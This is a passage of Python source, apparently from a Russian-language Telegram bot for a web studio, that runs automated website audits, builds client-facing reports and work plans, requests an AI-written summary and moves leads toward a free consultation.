            "закрывает страницу, не читая. Поисковики понижают такие сайты.",
            "Новый сайт запускаем сразу с SSL-сертификатом: замок в адресной строке, "
            "доверие с первой секунды и никаких предупреждений.", 3, ["pages"])

    if not p.get("viewport"):
        add("Сайт не адаптирован под телефоны",
            "Больше половины посетителей заходят со смартфона. Без адаптации текст мелкий, "
            "кнопки не нажимаются - человек уходит к конкуренту.",
            "Соберём сайт адаптивным: телефон, планшет, компьютер - везде читается "
            "и работает форма заявки.", 3, ["design"])

    ls = p.get("load_sec", 0)
    if ls > 2.5:
        add(f"Сайт загружается медленно - {ls} сек",
            "Каждая лишняя секунда ожидания забирает часть посетителей: люди уходят "
            "ещё до того, как увидят предложение. Реклама на такой сайт сливает бюджет.",
            "Новый сайт делаем лёгким и быстрым - открывается почти мгновенно, "
            "и рекламный бюджет работает на заявки, а не на ожидание.", 2 if ls < 5 else 3, ["pages"])

    if not p.get("title") or len(p.get("title", "")) < 15:
        add("Не заполнен заголовок страницы",
            "Это то, что видно во вкладке браузера и в результатах поиска. Пустой или "
            "короткий заголовок - сайт хуже находят и реже открывают.",
            "Пропишем заголовки под ваши услуги и город - сайт станет понятнее "
            "и поисковикам, и людям.", 2, ["analytics"])
    if not p.get("description"):
        add("Нет описания для поисковиков",
            "В выдаче под ссылкой показывается случайный кусок текста вместо внятного "
            "предложения - по такому сниппету кликают заметно реже.",
            "Напишем описание, которое объясняет, чем вы полезны, - выдача станет "
            "выглядеть как приглашение, а не как обрывок.", 1, ["analytics"])
    if not p.get("h1"):
        add("На странице нет главного заголовка H1",
            "Ни человек, ни поисковик не понимают с ходу, о чём страница.",
            "Сделаем чёткий первый экран: кто вы, что предлагаете и что делать дальше.", 2, ["pages"])

    if not p.get("analytics"):
        add("Не подключена аналитика",
            "Вы не видите, сколько людей заходит, откуда они и где уходят. "
            "Решения о рекламе принимаются вслепую.",
            "Подключим Яндекс Метрику с целями: будет видно каждый источник "
            "и каждую заявку - понятно, что окупается.", 2, ["analytics"])

    contacts = p.get("tel", 0) + p.get("mail", 0) + (1 if p.get("wa") else 0) + (1 if p.get("tg") else 0)
    if p.get("forms", 0) == 0 and contacts == 0:
        add("Некуда оставить заявку",
            "Посетителю негде нажать, чтобы связаться. Интерес есть - обращения нет.",
            "Поставим форму заявки и кнопки связи так, чтобы написать можно было "
            "с любого экрана, и заявки падали вам в Telegram.", 3, ["tgnotify"])
    elif p.get("forms", 0) == 0:
        add("Нет формы заявки",
            "Часть клиентов не хочет звонить - им проще оставить контакт. Без формы "
            "эти обращения просто не случаются.",
            "Добавим короткую форму и уведомления о заявках в Telegram - "
            "ни одно обращение не потеряется.", 2, ["tgnotify"])

    if not p.get("map") and p.get("sig_about", 0) > 0:
        add("Нет карты и понятного блока контактов",
            "Локальному бизнесу это стоит клиентов: человек не понимает, где вы находитесь.",
            "Добавим карту, маршрут и график работы - вас станет проще найти.", 1, ["maps"])

    if p.get("constructor"):
        add(f"Сайт собран на конструкторе ({p['constructor']})",
            "Такие сайты узнаваемы, ограничены в доработках, а за публикацию часто "
            "приходится платить ежемесячно.",
            "Сделаем сайт, который принадлежит вам: без абонентской платы, "
            "с возможностью дорабатывать что угодно.", 1, ["design"])

    y = p.get("footer_year", 0)
    if y and y < 2025:
        add(f"Сайт выглядит заброшенным - в подвале {y} год",
            "Устаревшая дата подсказывает клиенту, что компанией никто не занимается.",
            "На новом сайте актуальные данные и живой вид - доверие вместо сомнений.", 1, ["pages"])

    if not p.get("robots") or not p.get("sitemap"):
        miss = " и ".join([x for x in (["robots.txt"] if not p.get("robots") else []) +
                           (["карта сайта"] if not p.get("sitemap") else [])])
        add(f"Нет технических файлов для поиска ({miss})",
            "Поисковые роботы хуже обходят сайт - часть страниц может вообще "
            "не попасть в выдачу.",
            "Настроим техническую базу, чтобы сайт индексировался целиком.", 1, ["analytics"])

    if p.get("images", 0) > 8 and p.get("lazy", 0) == 0:
        add("Изображения грузятся все сразу",
            "Страница тяжелеет, на мобильном интернете открывается заметно дольше.",
            "Настроим отложенную загрузку - сайт будет открываться быстро "
            "даже при слабой связи.", 1, ["pages"])

    # Сайт в порядке - говорим не о проблемах, а о точках роста. Честно и без выдумок.
    if not f:
        if not p.get("sig_reviews"):
            add("Нет блока с отзывами",
                "Новый клиент не видит подтверждений, что вам можно доверять, - "
                "и уходит сравнивать вас с конкурентами.",
                "Добавим блок отзывов и кейсов: доверие закрывается до звонка.", 1, ["pages"])
        if p.get("h2_count", 0) < 4:
            add("Мало смысловых блоков на странице",
                "Посетитель быстро упирается в конец страницы, не получив ответов "
                "на свои вопросы, и уходит без обращения.",
                "Расширим структуру: услуги, преимущества, ответы на возражения, "
                "призыв к действию - путь до заявки станет очевидным.", 1, ["pages"])
        if not p.get("og"):
            add("Ссылка на сайт плохо выглядит при пересылке",
                "Когда клиент кидает вашу ссылку коллеге или в чат, вместо красивой "
                "карточки показывается голый адрес - доверия это не добавляет.",
                "Настроим превью: логотип, заголовок и описание при любой пересылке.", 1, ["pages"])
    f.sort(key=lambda x: -x["sev"])
    return f


def audit_pick_tariff(goal, findings, p):
    """Подобрать тариф по ЦЕЛИ сайта и тяжести находок."""
    sev = sum(x["sev"] for x in findings)
    svc = {s for x in findings for s in x["svc"]}
    reasons = []

    if goal == "catalog":
        tid = "system" if p.get("sig_cart", 0) > 3 else "leads"
        reasons.append("на сайте товары и каталог - важно показать ассортимент структурно, "
                       "с карточками и понятными ценами")
        svc.add("catalog")
    elif goal == "booking":
        tid = "leads"
        reasons.append("клиенты должны записываться сами, без переписки и звонков")
        svc.add("booking")
    elif goal == "leads":
        tid = "system" if sev >= 10 else "leads"
        reasons.append("ваш сайт нацелен на обращения, а сейчас он их теряет - "
                       "нужна структура, которая доводит посетителя до заявки")
    else:
        tid = "start" if sev <= 6 else "leads"
        reasons.append("сайту нужно прежде всего понятно рассказать о компании "
                       "и дать удобный способ связаться")

    crit = [x["title"] for x in findings if x["sev"] == 3]
    if crit:
        reasons.append("критично: " + ", ".join(c.lower() for c in crit[:2]))
    if tid == "start" and svc & {"catalog", "booking", "crm"}:
        tid = "leads"
    addons = [s for s in ("booking", "catalog", "design", "analytics") if s in svc and s in SERVICE]
    return tid, addons[:3], "; ".join(reasons)


def render_audit_md(a, p, findings, tid, addons, reasoning):
    """Красивый отчёт: что нашли → чем грозит → что дадим → какой тариф подходит."""
    t = TARIFF[tid]
    crit = sum(1 for x in findings if x["sev"] == 3)
    verdict = ("на сайте есть критичные проблемы" if crit else
               "сайт рабочий, но теряет клиентов" if findings else "сайт в неплохом состоянии")
    md = [f"# 🔍 Аудит сайта {p.get('domain', '')}", "",
          f"Проверили {len(findings)} параметр(ов) - **{verdict}**.", "",
          "| | |", "|---|---|",
          f"| Загрузка | {p.get('load_sec', '-')} сек |",
          f"| Защищённое соединение | {'✅ есть' if p.get('https') else '❌ нет'} |",
          f"| Версия для телефона | {'✅ есть' if p.get('viewport') else '❌ нет'} |",
          f"| Аналитика | {', '.join(p.get('analytics') or []) or '❌ не подключена'} |",
          f"| Форма заявки | {'✅ есть' if p.get('forms') else '❌ нет'} |", ""]
    if findings:
        # Показываем только самое важное. Раньше выводили семь пунктов подряд,
        # каждый в два абзаца - на телефоне это минута прокрутки, и человек
        # бросал читать на третьем. Оставляем четыре главных, остальные
        # называем строкой: они становятся поводом прийти на консультацию.
        top = sorted(findings, key=lambda x: -x["sev"])[:4]
        rest = [x for x in findings if x not in top]
        md += ["---", "", "# 📉 Что мешает получать клиентов", ""]
        for i, x in enumerate(top, 1):
            mark = "🔴" if x["sev"] == 3 else "🟠" if x["sev"] == 2 else "🟡"
            md += [f"### {mark} {i}. {x['title']}",
                   f"**Чем это грозит.** {x['risk']}",
                   f"**Как закрываем.** {x['gain']}", ""]
        if rest:
            md += ["**Нашли ещё:** " + ", ".join(x["title"].lower() for x in rest[:6]) + ".",
                   "", "Это мелочи по сравнению с верхними четырьмя, но вместе они "
                   "тоже забирают обращения. Разберём их на консультации.", ""]
    # Общий вывод: переводим список находок в одно понятное последствие.
    # Человек редко складывает семь пунктов в голове сам - делаем это за него.
    if findings:
        md += ["---", "", "# 💸 Что это значит для бизнеса", ""]
        md += [audit_business_impact(p, findings), ""]

    md += ["---", "",
           "*Проверка автоматическая, по открытым данным - это предварительная оценка, "
           "а не технический аудит с гарантией.*", "",
           "> Дальше - как мы это закроем. Без цен и обязательств: сначала "
           "покажем решение, деньги обсуждаем в самом конце."]
    return "\n".join(md)


def audit_business_impact(p, findings):
    """Один абзац: во что находки обходятся владельцу на практике.

    Не выдумываем проценты и суммы - их неоткуда взять, а выдуманная цифра
    убивает доверие быстрее, чем отсутствие цифры. Говорим о механике:
    откуда именно утекают люди и почему это не видно в отчётах."""
    crit = [x for x in findings if x["sev"] == 3]
    has = lambda *keys: any(k in x["title"].lower() for x in findings for k in keys)

    parts = []
    if crit:
        parts.append(
            f"Из {len(findings)} найденных проблем {len(crit)} - критичные. "
            "Это значит, что часть посетителей уходит с сайта ещё до того, "
            "как узнает, чем вы занимаетесь.")
    else:
        parts.append(
            "Критичных поломок нет - сайт работает. Но каждая из найденных "
            "мелочей забирает свою долю обращений, и вместе они складываются "
            "в заметную потерю.")

    # Самое важное следствие - под конкретный набор находок
    if has("телефон", "адаптир"):
        parts.append(
            "Главное: больше половины людей смотрят сайт со смартфона. "
            "Если там неудобно - они не пишут вам, а возвращаются в поиск "
            "и открывают следующего в списке. Вы этого даже не замечаете: "
            "в статистике это не «отказ клиента», а просто никогда не случившееся обращение.")
    elif has("защищённого соединения", "https"):
        parts.append(
            "Главное: браузер показывает вашим клиентам предупреждение «Не защищено». "
            "Человек, который видит такое перед тем как оставить телефон, "
            "телефон не оставляет.")
    elif has("медленно", "загружа"):
        parts.append(
            "Главное: люди не ждут. Пока страница открывается, часть посетителей "
            "закрывает вкладку - и если вы платите за рекламу, вы платите "
            "за этих ушедших тоже.")
    elif has("форм", "заявк", "связ"):
        parts.append(
            "Главное: человеку негде оставить заявку в момент, когда он готов. "
            "Готовность проходит за минуты, а потом он уже пишет кому-то другому.")

    if not p.get("analytics"):
        parts.append(
            "И отдельно: аналитика не подключена. Значит, вы не видите, "
            "сколько людей заходит, откуда они и на каком шаге уходят - "
            "поэтому потери и остаются незаметными.")

    parts.append(
        "Хорошая новость: всё это лечится. На бесплатной консультации разберём, "
        "что именно у вас забирает клиентов, и составим план - какой сайт нужен "
        "вашему бизнесу и в каком порядке его собирать.")
    return "\n\n".join(parts)


# Из каких находок какой пункт работ вырастает. Клиент должен увидеть,
# что каждая проблема из отчёта закрыта конкретным делом, а не общими словами.
PLAN_BY_SERVICE = {
    "design": ("Дизайн и мобильная версия",
               "Рисуем макет под ваши услуги и проверяем на телефоне, планшете и компьютере - "
               "чтобы кнопки нажимались пальцем, а текст читался без увеличения."),
    "pages": ("Скорость и техническая база",
              "Собираем сайт лёгким: сжатые изображения, отложенная загрузка, SSL-сертификат. "
              "Открывается почти мгновенно даже на мобильном интернете."),
    "tgnotify": ("Формы и заявки",
                 "Ставим короткую форму на каждый экран и кнопки связи. Заявка падает вам "
                 "в Telegram за секунду - ни одно обращение не теряется."),
    "analytics": ("Аналитика и поиск",
                  "Подключаем Яндекс Метрику с целями, прописываем заголовки и описания, "
                  "настраиваем robots.txt и карту сайта. Видно каждый источник и каждую заявку."),
    "maps": ("Контакты и карта",
             "Карта, маршрут, график работы и все способы связи в одном блоке - "
             "вас становится проще найти и проще выбрать."),
    "catalog": ("Каталог",
                "Раскладываем товары или услуги по разделам, с карточками, фото и ценами - "
                "человек находит нужное за два клика."),
    "booking": ("Онлайн-запись",
                "Ставим форму записи с выбором времени: клиент записывается сам, "
                "без переписки и звонков."),
}


def render_audit_plan_md(p, findings, addons):
    """Второй экран после аудита: как именно мы закроем найденное.
    Ни тарифов, ни сумм - только состав работ и порядок действий."""
    svc, seen = [], set()
    for x in findings:                       # порядок по тяжести находок
        for s in x.get("svc", []):
            if s in PLAN_BY_SERVICE and s not in seen:
                seen.add(s); svc.append(s)
    for s in addons:                          # то, что вытекает из цели сайта
        if s in PLAN_BY_SERVICE and s not in seen:
            seen.add(s); svc.append(s)
    if not svc:
        svc = ["design", "pages", "tgnotify"]

    md = ["# 🛠 Как мы это решим", "",
          f"Ниже - что войдёт в работу именно по вашему сайту. "
          f"Всё найденное закрывается за {'2-3 дня' if len(svc) <= 3 else '3-5 дней'} "
          f"до первой версии.", "", "---", ""]
    for i, s in enumerate(svc[:6], 1):
        name, how = PLAN_BY_SERVICE[s]
        md += [f"### {i}. {name}", how, ""]

    md += ["---", "", "# 📌 Как проходит работа", "",
           "| Шаг | Что происходит |", "|---|---|",
           "| 1 | Вы отвечаете на вопросы о бизнесе - 10 минут в этом же чате |",
           "| 2 | Мы собираем первую версию и присылаем ссылку |",
           "| 3 | Вы смотрите вживую и говорите, что поправить |",
           "| 4 | Правим, запускаем на вашем домене |", "",
           "---", "",
           "> Разработка - **0 ₽**. Вы ничего не платите за то, чтобы увидеть результат: "
           "сначала показываем готовый сайт, и только потом обсуждаем запуск.", "",
           "Хотите - начнём с вопросов о вашем бизнесе. Это ни к чему не обязывает."]
    return "\n".join(md)


def audit_report_kb():
    """Кнопки под первым экраном аудита - списком проблем.

    Раньше их тут не было вовсе: приглашение на консультацию стояло только
    под вторым сообщением. Человек, закрывший чат после списка проблем,
    выпадал из воронки молча - а это самый горячий момент, когда он только
    что увидел, что теряет клиентов."""
    return {"inline_keyboard": [
        [{"text": "🎯 Записаться на консультацию", "callback_data": "cons:offer"}],
        [{"text": "📄 Что с этим делать", "callback_data": "audit:plan"}],
    ]}


def audit_plan_kb():
    """После аудита ведём не в оплату, а в бесплатную консультацию."""
    return {"inline_keyboard": [
        [{"text": "🎯 Записаться на консультацию - бесплатно", "callback_data": "cons:offer"}],
        [{"text": "🚀 Сразу к делу - начать анкету", "callback_data": "brief:start"}],
        [{"text": "🏠 В меню", "callback_data": "b:home"}],
    ]}


AUDIT_RULES = [
    (("mobile", "adapt", "viewport", "responsive"), "Сайт неудобен на телефоне",
     "Большинство клиентов заходят со смартфона. Если сайт «едет» или мелкий текст - человек уходит, не дочитав.",
     ["design"]),
    (("speed", "load", "performance", "pagespeed", "ttfb"), "Сайт медленно загружается",
     "Каждая лишняя секунда загрузки увеличивает число тех, кто закрывает страницу до её открытия.",
     ["pages"]),
    (("ssl", "https", "certificate", "security"), "Проблемы с безопасностью (SSL/HTTPS)",
     "Браузер помечает такой сайт как небезопасный - это сразу убивает доверие и заявки.",
     ["pages"]),
    (("meta", "title", "description", "h1", "seo", "index", "robots", "sitemap"), "Слабая SEO-основа",
     "Сайт хуже находится в Яндексе и Google - вы теряете бесплатный поток клиентов из поиска.",
     ["analytics"]),
    (("counter", "metrika", "analytics", "goal"), "Не подключена аналитика",
     "Без аналитики не видно, откуда приходят клиенты и где они уходят - решения принимаются вслепую.",
     ["analytics"]),
    (("form", "contact", "phone", "feedback", "cta"), "Неочевидная форма заявки / контакты",
     "Если непонятно, как с вами связаться, клиент просто уходит к конкуренту.",
     ["tgnotify"]),
    (("text", "content", "unique", "spam", "water"), "Слабые тексты и структура",
     "Клиент не понимает, что вы предлагаете и почему стоит выбрать именно вас.",
     ["pages"]),
]

# Базовые пункты, если PR-CY не дал деталей (говорим осторожно, как о предварительной оценке)
AUDIT_FALLBACK = [
    ("Первый экран не объясняет ценность", "За 5 секунд клиент должен понять, кто вы и чем полезны - иначе он закроет сайт.", ["pages"]),
    ("Заявку оставить неудобно", "Если кнопка заявки не на виду, часть клиентов теряется просто из-за неудобства.", ["tgnotify"]),
    ("Не видно аналитики", "Без Метрики непонятно, работает сайт или просто существует.", ["analytics"]),
]


def audit_recommendations(points):
    """Слабые места -> (список пунктов, набор рекомендованных услуг)."""
    out, services = [], []
    for p in points:
        key = (str(p.get("name", "")) + " " + str(p.get("results", ""))).lower()
        matched = False
        for keys, title, why, svcs in AUDIT_RULES:
            if any(k in key for k in keys):
                if title not in [o[0] for o in out]:
                    out.append((title, why, svcs))
                    services += svcs
                matched = True
                break
        if not matched and p.get("name") and len(out) < 5:
            out.append((f"Замечание по проверке «{p['name']}»",
                        "Этот пункт снижает качество сайта в глазах поисковых систем и посетителей.",
                        ["pages"]))
    if not out:
        for title, why, svcs in AUDIT_FALLBACK:
            out.append((title, why, svcs))
            services += svcs
    out = out[:5]
    services = [s for s in dict.fromkeys(services) if s in SERVICE]
    return out, services


def audit_price(services):
    """Стоимость в ONYX по нашему прайсу + ориентировочное сравнение с рынком."""
    svc = [s for s in services if s in SERVICE] or ["pages"]
    total = sum(SERVICE[s]["price"] for s in svc)
    onyx = f"от {fmt_amount(total)} (разработка сайта - 0 ₽, вы платите только за нужные опции)"
    market = (f"ориентировочно {fmt_amount(total * 3)} - {fmt_amount(total * 6)} - "
              "в большинстве студий разработка оплачивается отдельно")
    return svc, onyx, market


# ---- AI-резюме ----
def ai_summarize(url, points_raw, weak, services):
    """Короткое резюме. Если AI_API_KEY не задан - детерминированная заглушка без выдумок."""
    weak_txt = "; ".join(t for t, _, _ in weak)
    if not AI_API_KEY:
        return (f"Мы посмотрели сайт {url_domain(url)}. Это предварительная оценка по открытым техническим "
                f"данным. Основное, что может мешать заявкам: {weak_txt.lower()}. "
                "Точную картину покажет ручная проверка нашей командой.")
    facts = json.dumps(points_raw, ensure_ascii=False)[:4000]
    prompt = (
        "Ты - эксперт веб-студии ONYX. Напиши КРАТКОЕ резюме аудита сайта простыми словами "
        "для владельца малого бизнеса (3-5 предложений, без маркетингового пафоса).\n"
        "СТРОГИЕ ПРАВИЛА: не выдумывай цифры и показатели, которых нет в данных; "
        "не давай гарантий роста заявок; формулируй как ПРЕДВАРИТЕЛЬНУЮ оценку.\n\n"
        f"Сайт: {url}\nВыявленные слабые места: {weak_txt}\n"
        f"Технические данные PR-CY (могут быть неполными): {facts}\n\n"
        "Верни только текст резюме, без заголовков."
    )
    try:
        if "openai" in AI_API_URL or "/chat/completions" in AI_API_URL:
            payload = {"model": AI_MODEL, "max_tokens": 500,
                       "messages": [{"role": "user", "content": prompt}]}
            headers = {"Content-Type": "application/json",
                       "Authorization": f"Bearer {AI_API_KEY}"}
        else:
            payload = {"model": AI_MODEL, "max_tokens": 500,
                       "messages": [{"role": "user", "content": prompt}]}
            headers = {"Content-Type": "application/json", "x-api-key": AI_API_KEY,
                       "anthropic-version": "2023-06-01"}
        req = urllib.request.Request(AI_API_URL, data=json.dumps(payload).encode("utf-8"),
                                     headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=25) as r:
            res = json.load(r)
        if res.get("content"):  # Anthropic
            return "".join(b.get("text", "") for b in res["content"] if b.get("type") == "text").strip()
        if res.get("choices"):  # OpenAI
            return (res["choices"][0].get("message") or {}).get("content", "").strip()
    except Exception as e:
        print("AI err:", e)
    return (f"Мы посмотрели сайт {url_domain(url)}. Это предварительная оценка: "
            f"{weak_txt.lower()}. Точную картину покажет ручная проверка командой ONYX.")


def audit_result_kb():
    """Повторный показ аудита из реестра.

    Раньше отсюда вели сразу в предложение и заказ - то есть к деньгам, минуя
    консультацию. Человек, который вернулся посмотреть свой аудит второй раз,
    как раз созрел для разговора, поэтому первой кнопкой ставим её."""
    return {"inline_keyboard": [
        [{"text": "🎯 Записаться на консультацию", "callback_data": "cons:offer"}],
        [{"text": "🌐 Хочу новый сайт - начать анкету", "callback_data": "brief:start"}],
        [{"text": "🆘 Написать менеджеру", "callback_data": "myorder:support"},
         {"text": "🏠 В меню", "callback_data": "b:home"}],
    ]}


def render_audit(a, weak, services, onyx_price, market):
    lines = [f"🔍 <b>Мы проверили ваш сайт: {url_domain(a['website_url'])}</b>", "",
             "<b>Краткий вывод:</b>", a.get("ai_summary", ""), "",
             "<b>Что может мешать заявкам:</b>"]
    for i, (title, why, _s) in enumerate(weak, 1):
        lines.append(f"\n{i}. <b>{title}</b>\nПочему это важно: {why}")
    lines.append("\n<b>Что может сделать ONYX:</b>")
    for s in services[:6]:
        lines.append(f"- {SERVICE[s]['name'].lower()}")
    lines.append(f"\n<b>Стоимость в ONYX:</b>\n{onyx_price}")
    lines.append(f"\n<b>В других студиях подобные доработки могут стоить:</b>\n{market}")
    lines.append("\n<i>Это предварительная оценка по открытым данным - не гарантия и не точный расчёт.</i>")
    lines.append("\nХотите, чтобы мы подготовили предложение по улучшению вашего сайта?")
    return "\n".join(lines)


def resend_audit(chat_id, uid, a):
    """Повторно отправить уже готовый аудит из реестра (по сохранённым данным)."""
    lines = [f"🔍 <b>Аудит сайта: {url_domain(a.get('website_url', ''))}</b>",
             f"<i>Дата: {a.get('created_at', '')}</i>", ""]
    if a.get("ai_summary"):
        lines += ["<b>Краткий вывод:</b>", a["ai_summary"], ""]
    if a.get("weak_points"):
        lines += ["<b>Слабые места:</b>", a["weak_points"], ""]
    if a.get("recommended_services"):
        lines += [f"<b>Что может сделать ONYX:</b> {a['recommended_services']}"]
    if a.get("estimated_onyx_price"):
        lines += [f"<b>Стоимость в ONYX:</b> {a['estimated_onyx_price']}"]
    send(chat_id, "\n".join(lines), audit_result_kb())
    p = user_get(uid) or {}
    p["audit_done"] = True; user_save(uid, p)
    recompute_tags(uid)


def audit_finish(a, raw):
    """PR-CY данные получены -> слабые места -> AI -> отправка клиенту."""
    p = raw if isinstance(raw, dict) else {}
    a["prcy_raw_result"] = json.dumps(p, ensure_ascii=False)[:45000]
    a["status"] = "data_received"
    audit_save(a, to_sheet=False)

    findings = audit_findings(p)
    goal, conf, goal_why = detect_site_goal(p)          # цель сайта - только для нас
    tid, addons, reasoning = audit_pick_tariff(goal, findings, p)

    a["site_goal"] = goal
    a["goal_confidence"] = conf
    a["goal_debug"] = goal_why
    a["weak_points"] = "; ".join(x["title"] for x in findings)
    a["recommended_tariff"] = tid
    a["recommended_services"] = ", ".join(SERVICE[s]["name"] for s in addons)
    a["estimated_onyx_price"] = tariff_price(TARIFF[tid])
    a["ai_summary"] = (f"Цель сайта: {goal}. Найдено проблем: {len(findings)}. "
                       f"Рекомендован тариф «{TARIFF[tid]['name']}».")
    a["status"] = "report_ready"
    audit_save(a, to_sheet=False)

    # После отчёта клиент видит РЕШЕНИЕ, а не ценник. Подобранный тариф остаётся
    # внутренней подсказкой для нас: цену обсуждаем после консультации и анкеты.
    _uid = a["telegram_id"]
    _pp = user_get(_uid) or {}
    _pp["audit_goal"] = goal
    _pp["audit_tariff_hint"] = tid
    _pp["audit_site"] = p.get("domain", "") or a.get("website_url", "")
    user_save(_uid, _pp)

    # Два экрана: что нашли → как это решим и приглашение на консультацию.
    # Кнопка на консультацию есть под обоими: человек может закрыть чат сразу
    # после списка проблем, и тогда второй экран он уже не увидит.
    send_rich(_uid, render_audit_md(a, p, findings, tid, addons, reasoning),
              reply_markup=audit_report_kb())
    send_rich(_uid, render_audit_plan_md(p, findings, addons),
              reply_markup=audit_plan_kb())
    a["status"] = "sent_to_client"
    audit_save(a)
    # регистрируем аудит в реестре по домену (для дедупа/свежести)
    try:
        audit_registry_set(normalize_domain(a["website_url"]), a["audit_id"])
    except Exception as e:
        print("audit registry err", e)
    # отметка «прошёл аудит» → тег + температура warm
    _auid = a["telegram_id"]
    _pp = user_get(_auid) or {}
    _pp["audit_done"] = True
    if _pp:
        user_save(_auid, _pp)
    log_event(_auid, "audit_done", a.get("website_url", ""))
    lead_touch(_auid, username=a.get("username"), status="audit_sent", action="audit_done")
    recompute_tags(_auid)
    try:
        offer_create(a)  # коммерческое предложение после аудита
        cancel_followups(_auid, ("idle_after_start",))
        schedule_followup(_auid, "audit_no_order", a.get("username", ""))
    except Exception as e:
        print("audit offer/followup err", e)
    GOAL_NAMES = {"leads": "заявки", "catalog": "каталог/товары",
                  "booking": "онлайн-запись", "visitka": "визитка"}
    notify_admins(f"🔍 <b>Новый аудит №{a['audit_id']}</b>\n"
                  f"Сайт: {a['website_url']}\n"
                  f"Клиент: id {a['telegram_id']} {('@' + a['username']) if a.get('username') else ''}\n"
                  f"<b>Цель сайта (определил бот):</b> {GOAL_NAMES.get(goal, goal)} "
                  f"(уверенность {int(conf * 100)}%)\n"
                  f"Скорость: {p.get('load_sec')}с · HTTPS: {'да' if p.get('https') else 'НЕТ'} · "
                  f"Адаптив: {'да' if p.get('viewport') else 'НЕТ'}\n"
                  f"Конструктор: {p.get('constructor') or '-'}\n"
                  f"Найдено проблем: {len(findings)} (критичных: "
                  f"{sum(1 for x in findings if x['sev'] == 3)})\n"
                  f"<b>Предложен тариф:</b> {TARIFF[tid]['name']}\n"
                  f"<i>Веса целей: {goal_why}</i>")
    return a


def audit_fail(a, reason=""):
    a["status"] = "failed"
    a["fail_reason"] = reason
    audit_save(a)
    # Сайт недоступен - но человек уже пришёл с запросом и ждёт ответа.
    # Раньше отсюда вели только в анкету, и половина уходила. Ведём в консультацию:
    # разобрать нишу можно и без доступа к сайту.
    send_rich(a["telegram_id"],
              "## 🔍 Не смогли открыть сайт автоматически\n\n"
              "Сайт не ответил роботу или закрыт от проверок. Само по себе это "
              "уже сигнал: если наш робот не заходит, то и поисковый, скорее всего, тоже - "
              "а значит вас хуже находят.\n\n"
              "**Что предлагаем.** Посмотрим сайт руками на бесплатной консультации: "
              "откроем его вместе, разберём, что мешает получать заявки, и составим план. "
              "Это тридцать минут, без обязательств и без оплаты.\n\n"
              "> Если сайта по сути нет - тем более приходите. Разберём вашу нишу "
              "и покажем, каким должен быть первый сайт.", None,
              {"inline_keyboard": [
                  [{"text": "🎯 Записаться на консультацию", "callback_data": "cons:offer"}],
                  [{"text": "🔗 Проверить другой адрес", "callback_data": "audit:again"}],
                  [{"text": "🏠 В меню", "callback_data": "b:home"}]]})
    create_task("audit", a.get("audit_id", ""), f"Сделать аудит вручную: {a.get('website_url', '')}",
                description=f"Причина: {reason or 'сайт недоступен'}",
                telegram_id=a.get("telegram_id"), priority="high", notify=False)
    notify_admins(f"⚠️ <b>Аудит №{a['audit_id']} - нужен ручной разбор</b>\n"
                  f"Сайт: {a['website_url']}\n"
                  f"Клиент: id {a['telegram_id']} {('@' + a['username']) if a.get('username') else ''}\n"
                  f"Причина: {reason or 'сайт недоступен'}")
    return a


def audit_start(chat_id, uid, url, username="", force=False):
    domain = normalize_domain(url)
    lead_touch(uid, username=username, status="audit_requested", action="audit_requested")
    # --- Реестр аудитов: дедуп по домену + проверка свежести ---
    if not force:
        existing, fresh = audit_registry_get(domain)
        if existing and fresh:
            send(chat_id, f"✅ У нас уже есть свежий аудит сайта <b>{domain}</b> "
                          f"(от {existing.get('created_at', '')}). Отправляю его:")
            resend_audit(chat_id, uid, existing)
            return existing
        if existing and not fresh:
            send(chat_id, f"📄 Мы уже проверяли <b>{domain}</b> ({existing.get('created_at', '')}), "
                          "но данные могли устареть. Обновить аудит?",
                 {"inline_keyboard": [
                     [{"text": "🔄 Обновить аудит", "callback_data": f"audit:refresh:{domain}"}],
                     [{"text": "📄 Показать прежний", "callback_data": f"audit:show:{existing.get('audit_id')}"}],
                 ]})
            return existing
    a = audit_new(uid, username, url)
    send(chat_id, f"🔎 Открываем <b>{domain}</b> и смотрим, что мешает получать клиентов…")
    try:
        p = site_probe(url)
    except Exception as e:
        log_error("audit", f"{domain}: {e}", notify=False)
        audit_fail(a, f"ошибка анализа: {e}")
        return a
    if not p.get("reachable"):
        audit_fail(a, f"сайт не открылся: {p.get('error', 'нет ответа')}")
        return a
    return audit_finish(a, p)


def run_pending_audits():
    """Cron: подчистить зависшие аудиты. Анализ теперь выполняется сразу в момент
    запроса (свой чекер вместо внешнего сервиса), поэтому очередь почти всегда пуста -
    сюда попадает только то, что оборвалось на полпути."""
    n = 0
    for aid in audits_pending_all():
        a = audit_get(aid)
        if not a or a.get("status") in ("sent_to_client", "failed"):
            audits_pending_remove(aid)
            continue
        try:
            p = site_probe(a.get("website_url", ""))
            if p.get("reachable"):
                audit_finish(a, p)
                n += 1
            else:
                audit_fail(a, f"сайт не открылся: {p.get('error', '')}")
        except Exception as e:
            audit_fail(a, f"ошибка анализа: {e}")
        audits_pending_remove(aid)
    return n


# ------------------------- Этап 5: раздел «Мой заказ» -------------------------
def my_order_empty_kb():
    return {"inline_keyboard": [
        [{"text": "📝 Заполнить анкету", "callback_data": "brief:start"}],
        [{"text": "🛒 Перейти к услугам", "callback_data": "svc:list"}],
        [{"text": "🏠 Назад в меню", "callback_data": "b:home"}],
    ]}


def my_order_active_kb(oid):
    return {"inline_keyboard": [
        [{"text": "👍 ОК", "callback_data": "myorder:ok"}],
        [{"text": "✏️ Отправить правки", "callback_data": "myorder:changes"}],
        [{"text": "⚡ Ускорить проект", "callback_data": f"myorder:urgent:{oid}"}],
        [{"text": "👨‍💻 Написать разработчику", "callback_data": "myorder:dev"},
         {"text": "🆘 Написать в поддержку", "callback_data": "myorder:support"}],
    ]}


def render_my_order(uid):
    """Возвращает (text, keyboard) для раздела «Мой заказ»."""
    o = active_order(uid)
    if not o:
        return ("📦 <b>Мой заказ</b>\n\n"
                "У вас пока нет активного заказа. Вы можете выбрать услуги в разделе "
                "«Тарифы и услуги» или заполнить анкету на разработку сайта.",
                my_order_empty_kb())
    key = proj_status(o)
    names = ", ".join(SERVICE.get(c, {}).get("name", c) for c in o.get("items", [])) or "-"
    pay = PAY_STATUS_RU.get(o.get("payment_status", "pending"), o.get("payment_status", "-"))
    lines = [
        f"📦 <b>Заказ №{o['id']}</b>",
        f"📅 Создан: {o.get('created', '-')}",
        f"🧩 Услуги: {names}",
        f"💰 Сумма: {fmt_amount(o.get('total', 0))}",
        f"💳 Оплата: {pay}",
        "",
        f"📈 <b>Статус проекта:</b> {ps_label(key)}",
        ps_desc(key),
    ]
    if ps_eta(key) and ps_eta(key) != "-":
